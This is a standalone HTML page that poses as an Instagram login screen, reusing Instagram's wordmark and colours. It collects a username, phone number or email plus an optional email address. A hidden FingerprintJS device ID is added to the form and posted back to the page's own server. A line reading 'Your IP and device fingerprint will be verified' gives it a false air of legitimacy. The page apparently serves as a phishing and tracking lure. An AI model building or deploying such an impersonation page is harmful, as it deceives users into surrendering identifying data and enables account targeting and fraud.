<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
  <style>
    body {
      background-color: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 100%;
      max-width: 350px;
      text-align: center;
    }
    .logo {
      background-image: url('https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png');
      background-repeat: no-repeat;
      background-size: contain;
      height: 51px;
      margin: 22px auto 12px auto;
      width: 175px;
    }
    input {
      width: 100%;
      padding: 9px 8px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      background-color: #fafafa;
      border-radius: 3px;
      font-size: 14px;
    }
    button {
      width: 100%;
      padding: 9px;
      margin-top: 10px;
      background-color: #3897f0;
      border: none;
      color: white;
      font-weight: bold;
      border-radius: 4px;
      font-size: 14px;
      cursor: pointer;
    }
    .note {
      margin-top: 20px;
      font-size: 0.85rem;
      color: #999;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo"></div>
    <form method="POST">
      <input type="text" name="name" placeholder="Phone number, username, or email" required>
      <input type="email" name="email" placeholder="Email (optional)">
      <input type="hidden" id="fingerprint" name="fingerprint">
      <button type="submit">Next</button>
    </form>
    <div class="note">
      Your IP and device fingerprint will be verified.
    </div>
  </div>

  <script>
    FingerprintJS.load().then(fp => {
      fp.get().then(result => {
        document.getElementById('fingerprint').value = result.visitorId;
      });
    });
  </script>
</body>
</html>
